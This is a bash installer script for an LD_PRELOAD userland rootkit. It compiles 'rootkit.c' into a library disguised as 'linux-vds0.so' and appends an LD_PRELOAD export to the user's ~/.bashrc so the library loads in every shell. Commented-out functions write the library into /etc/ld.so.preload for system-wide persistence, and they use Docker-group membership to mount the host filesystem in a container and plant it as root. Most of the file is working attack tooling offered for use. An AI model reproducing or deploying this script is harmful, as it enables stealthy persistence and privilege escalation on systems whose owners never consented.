#!/bin/bash

GREEN="\e[32m"
GREENBG="\e[1;42m"
RED="\e[0;31m"
RESETCOL="\e[0m"
LIB="/lib/librootkit"
LIBPATH=$(pwd)
BASHRCBACKUP=.bashrc.backup

show_usage () {
    echo -e "USAGE\n\t --export\n\t --remove\n"
    exit 1
}

# load_library () {
#     # if /etc/librootkit do not exist, create it
#     if [ -d "$LIB" ]; then
#         mv linux-vds0.so /lib/librootkit/linux-vds0.so
#         echo "/lib/librootkit/linux-vds0.so" >> /etc/ld.so.preload
#     else
#         mkdir /lib/librootkit
#         mv linux-vds0.so /lib/librootkit/linux-vds0.so
#         echo "/lib/librootkit/linux-vds0.so" >> /etc/ld.so.preload
#     fi
# }

# remove_library () {
#     chattr -ia /etc/ld.so.preload
#     rm -rf /etc/ld.so.preload /lib/librootkit/linux-vds0.so
# }

# docker_esc () {
#     # if /etc/librootkit do not exist, create it
#     if [ -d "$LIB" ]; then
#         cd /
#         docker run -v /:/mnt -i -t alpine sh -c "mv mnt${LIBPATH}/linux-vds0.so mnt/lib/librootkit/linux-vds0.so; echo '/lib/librootkit/linux-vds0.so' >> mnt/etc/ld.so.preload"
#     else
#         cd /
#         docker run -v /:/mnt -i -t alpine sh -c "mkdir mnt/lib/librootkit; mv mnt${LIBPATH}/linux-vds0.so mnt/lib/librootkit/linux-vds0.so; echo '/lib/librootkit/linux-vds0.so' >> mnt/etc/ld.so.preload"
#     fi
# }

# docker_remove () {
#     cd /
#     docker run -v /:/mnt -i -t alpine sh -c "rm -rf mnt/etc/ld.so.preload mnt/lib/librootkit/linux-vds0.so"
# }

# verify if arguments are valid
if [ "$#" -eq 0 ]; then 
    echo -e "${RED}No arguments suplied!${RESETCOL}"; show_usage
fi
if [ "$#" -eq 2 ]; then 
    echo -e "${RED}Too many arguments!${RESETCOL}"; show_usage
fi

# compile source
gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl

if [ "$@" == "--export" ]; then
    # trust me, do not touch this file .bashrc.backup
    if [ ! -f "$BASHRCBACKUP" ]; then
        cp ~/.bashrc .bashrc.backup
    else
        cat .bashrc.backup > .bashrc.mod; echo "export LD_PRELOAD=$(pwd)/linux-vds0.so" >> .bashrc.mod
        cat .bashrc.mod > ~/.bashrc
        bash && clear
    fi

elif [ "$@" == "--remove" ]; then
    cat .bashrc.backup > .bashrc.mod; echo "unset LD_PRELOAD" >> .bashrc.mod
    cat .bashrc.mod > ~/.bashrc
    rm linux-vds0.so
    bash && clear
fi

# compare given argument
# for arg in "$@"; do
#     case "$arg" in
#     --load-android)
#         echo -e "execute the following command:\n\texport LD_PRELOAD=$(pwd)/linux-vds0.so"
#         ;;
#     --load-root)
# 	    echo -e "${GREEN}Exporting malicious library...${RESETCOL}"
# 	    if [[ $EUID == 0 ]]; then
#             remove_library
# 	    fi
# 	    ;;
#     --load-docker)
#         echo -e "${GREEN}Exporting malicious library...${RESETCOL}"
#         if groups | grep -q "docker"; then
#             docker_esc
#         fi
#         ;;
#     --remove-android)                                                
# 	    echo -e "execute the following command:\n\tunset LD_PRELOAD"
#         ;;
#     --remove-root)
#         echo -e "${GREEN}Wiping /etc/ld.so.preload & removing compiled source...${RESETCOL}" 
#         if [[ $EUID == 0 ]]; then
#             remove_library
#         fi
# 	    ;;
#     --remove-docker)
# 	    echo -e "${GREEN}Wiping /etc/ld.so.preload & removing compiled source...${RESETCOL}"
# 	    if groups | grep -q "docker"; then
#             docker_remove
#         fi
# 	    ;;
#     esac
# done
